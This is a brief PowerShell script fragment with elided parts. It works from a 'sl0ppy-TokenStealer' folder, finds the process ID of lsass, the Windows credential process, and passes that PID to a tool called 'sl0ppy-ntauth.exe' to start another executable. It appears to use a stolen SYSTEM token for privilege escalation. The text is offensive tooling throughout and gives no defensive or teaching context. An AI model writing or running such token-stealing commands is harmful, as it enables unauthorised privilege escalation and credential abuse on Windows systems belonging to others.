...
Write-Host ""
Write-Host ""
cd -Path 'C:\Users\x0\Desktop\sl0ppy-ALPI\sl0ppy-TokenStealer' -PassThru
Write-Host ""
Write-Host ""
...
sleep 5 
$i = get-process lsass |select -expand id
powershell ./sl0ppy-ntauth.exe pid:$i binary:C:\Users\x0\Desktop\sl0ppy-ALPI\sl0ppy-ntc.exe 
